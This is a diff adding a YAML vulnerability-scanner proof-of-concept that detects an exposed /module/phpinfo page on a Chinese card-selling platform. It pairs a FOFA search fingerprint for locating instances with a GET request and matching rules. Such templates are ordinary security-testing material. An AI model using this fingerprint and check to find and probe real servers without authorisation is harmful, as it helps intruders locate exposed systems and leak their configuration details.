@@ -1,0 +1,16 @@
+id: poc-yaml-hm-faka-module-phpinfo-lnfoleak
+info:
+  name: 红盟发卡系统 /module/phpinfo 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 红盟云卡系统
+  fofa: /assets/shop/dist/uaredirect.js?v=1.2.0
+requests:
+- method: GET
+  path: /module/phpinfo
+  expression: "status_code == 200 && \ncontains(title,\"phpinfo\") &&\ncontains(body,\"\
+    PHP Version\") &&\ncontains(body,\"PHP Extension\") &&\ncontains(body,\"<!DOCTYPE\
+    \ html\")\n"
+variables: {}
+transport: http
